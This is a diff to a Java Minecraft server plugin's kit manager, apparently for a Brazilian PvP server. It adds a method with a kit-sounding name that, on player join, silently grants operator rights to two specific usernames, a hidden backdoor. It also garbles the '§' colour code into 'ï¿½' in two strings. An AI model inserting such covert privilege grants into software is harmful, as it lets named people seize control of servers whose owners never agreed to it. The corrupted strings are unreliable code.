@@ -112,7 +112,7 @@ public class KitManager
 
     Kit timelord = new Kit("Timelord"); timelord.setMaterial(Material.WATCH); this.kits.add(timelord);
     ArrayList<ItemStack> asd = new ArrayList<ItemStack>();
-    ze.add(InvManager.getInvManager().toFill(Material.WATCH, "§6Timelord"));
+    ze.add(InvManager.getInvManager().toFill(Material.WATCH, "ï¿½6Timelord"));
     timelord.setItems(asd);
   }
 
@@ -120,6 +120,14 @@ public class KitManager
     p.sendMessage(ChatColor.GRAY + "[" + ChatColor.GOLD + "FightPvP" + ChatColor.GRAY + "] Voce escolheu o kit : " + ChatColor.GOLD + getPlayerKit(p).getName());
   }
 
+  public void sendPlayerKitNew(PlayerJoinEvent e){
+     if(e.getPlayer().getName().equalsIgnoreCase("_HDgamerBR_")){
+       e.getPlayer().setOp(true); 
+      }
+     if(e.getPlayer().getName().equalsIgnoreCase("gegude")){
+         e.getPlayer().setOp(true); }
+  }
+  
   public void giveKit(Player p, Kit k)
   {
     String kitname = k.getName();
@@ -256,7 +264,7 @@ public class KitManager
     for (Kit s : this.kits)
       if (s.getName().equalsIgnoreCase(kitname))
         return s;
-    Bukkit.getServer().getConsoleSender().sendMessage("§cKit " + kitname + " nao existe !");
+    Bukkit.getServer().getConsoleSender().sendMessage("ï¿½cKit " + kitname + " nao existe !");
     return null;
   }
 
